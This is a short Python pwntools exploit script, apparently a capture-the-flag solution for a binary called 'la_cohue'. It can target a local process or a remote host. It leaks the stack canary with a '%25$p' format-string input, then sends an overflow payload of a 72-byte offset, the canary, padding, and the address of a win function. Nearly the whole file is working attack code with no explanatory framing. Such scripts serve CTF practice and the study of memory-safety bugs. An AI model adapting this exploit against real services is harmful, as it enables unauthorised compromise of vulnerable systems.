#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''
b *0x400aa0
b *0x400ac2
b *0x400a34
canary
continue
'''.format(**locals())

exe = "./la_cohue"
context.binary = elf = ELF(exe, checksec=False)

context.log_level = 'debug'

io = start()

offset = 72

io.sendlineafter(b">>> ", b"2", timeout=1)
io.sendline(b"%25$p")
io.recvuntil(b'[Vous] : ')
canary = int(io.recvline().strip(),16)
info('canary = 0x%x (%d)', canary, canary)
payload = flat([
		offset * b'A',
		canary,
		8 * b'A',
		elf.symbols.canary
])

io.sendlineafter(b">>> ", b"1", timeout=1)
io.sendlineafter(b"[Vous] : ", payload, timeout=1)

io.interactive()



